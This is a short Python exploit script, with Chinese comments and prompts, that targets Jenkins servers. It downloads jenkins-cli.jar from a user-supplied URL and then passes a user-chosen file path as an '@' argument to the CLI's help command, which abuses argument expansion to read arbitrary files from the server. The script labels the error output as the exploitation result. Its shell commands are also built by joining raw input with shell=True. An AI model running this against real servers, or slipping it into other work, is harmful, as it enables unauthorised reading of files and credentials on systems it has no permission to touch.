import requests
import os
import subprocess

url = input("[+]请输入url:")

# 获取脚本所在目录的绝对路径
script_dir = os.path.dirname(os.path.abspath(__file__))
jar_path = os.path.join(script_dir, "jenkins-cli.jar")

if os.path.exists(jar_path):
    print("[+] 文件已存在，无需下载。")
else:
    # 使用完整的路径来下载文件
    curl_command = f"curl -o {jar_path} " + url + "/jnlpJars/jenkins-cli.jar"
    ret = os.system(curl_command)
    if ret == 0:
        print("[+] 下载成功")
        file_path = input("[+]请输入要查看的文件路径:")
# 运行java命令时，也确保使用jar包的完整路径
        cmd = f'java -jar {jar_path} -s {url} -http help 1 "@{file_path}"'
        result = subprocess.run(cmd, capture_output=True, text=True, shell=True) # 加上 shell=True 让命令被 shell 解析

        if result.returncode == 0:
        # 成功执行的输出通常在 stdout
            print("[+] 执行成功")
            print(result.stdout)
        else:
        # 失败的输出或漏洞利用的输出通常在 stderr
            print("[+] 漏洞利用结果或执行失败信息:")
            print(result.stderr)
    else:
        print("[-] 下载失败")














